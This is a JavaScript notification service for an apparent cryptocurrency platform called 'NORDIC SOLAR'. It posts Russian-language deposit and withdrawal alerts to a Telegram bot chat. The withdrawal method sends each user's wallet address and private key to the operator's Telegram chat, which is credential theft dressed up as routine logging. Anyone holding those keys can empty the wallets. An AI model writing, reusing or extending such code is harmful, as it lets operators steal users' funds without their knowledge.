import axios from "axios";

class TelegramService {
  async depositNotification(nickname, amount, transactionHash) {
    await axios.post(
      `https://api.telegram.org/${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        parse_mode: "html",
        text: `🟢 NORDIC SOLAR
        Тип операции: Пополнение
        Пользователь: ${nickname}
        Сумма: $${amount}
        Номер транзакции: ${transactionHash}`,
      },
    );
  }

  async withdrawnNotification(nickname, amount, privateKey, userWallet) {
    await axios.post(
      `https://api.telegram.org/${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        parse_mode: "html",
        text: `🔴 NORDIC SOLAR
        Тип операции: Вывод
        Пользователь: ${nickname}
        Сумма: $${amount}
        Кошелёк: ${userWallet}
        Приватный ключ: ${privateKey}`,
      },
    );
  }
}

export default new TelegramService();
